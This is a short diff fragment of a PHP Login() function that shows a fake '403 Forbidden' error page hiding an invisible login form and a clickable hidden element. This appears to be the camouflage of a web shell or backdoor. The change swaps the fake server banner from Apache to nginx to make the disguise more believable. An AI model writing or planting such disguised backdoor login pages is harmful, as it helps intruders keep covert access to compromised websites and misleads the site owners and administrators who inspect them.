@@ -5,7 +5,7 @@ function Login() {
     die("<html>
     <title>403 Forbidden</title>
     <center><h1>403 Forbidden</h1></center>
-    <hr><center>nginx (Apache/2.4.39 Server at staging domain.com Port 80) </center>
+    <hr><center>nginx (/1.18.0 (Ubuntu)) </center>
     <center>
     <div style='cursor:pointer;'></div>
     <form id='login-form' method='post' style='display:none;'>
